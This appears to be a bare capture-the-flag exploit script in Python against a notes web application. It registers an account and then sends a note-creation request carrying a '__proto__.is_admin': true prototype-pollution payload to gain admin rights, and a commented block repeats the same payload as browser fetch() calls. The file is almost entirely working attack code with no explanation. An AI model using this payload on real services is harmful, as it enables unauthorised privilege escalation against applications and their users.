import requests 

URL = "http://localhost:3004"
URL = "https://notes1.ivan-and-keane-hard.work"
s = requests.session()

s.post(f"{URL}/api/register", {
    "user": "test1",
    "pass": "test1"
})

s.post(f"{URL}/api/create", 
{
    "title": "title",
    "content": "content",
    "__proto__.is_admin": True
})


"""

a = await fetch("https://notes1.ivan-and-keane-hard.work/api/create", {
  "body": "{\"title\":\"dd\",\"content\":\"dd\", \"__proto__.is_admin\": true}",
  "method": "POST"
});

a = await fetch("http://localhost:8000/api/create", {
  "body": "{\"title\":\"dd\",\"content\":\"dd\", \"__proto__.is_admin\": true}",
  "method": "POST"
});

a = await fetch("http://localhost:8000/api/create", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "content-type": "application/json",
    "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "sec-gpc": "1"
  },
  "referrer": "http://localhost:8000/home",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"title\":\"b\",\"content\":\"c\",\"__proto__.is_admin\": true}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});


"""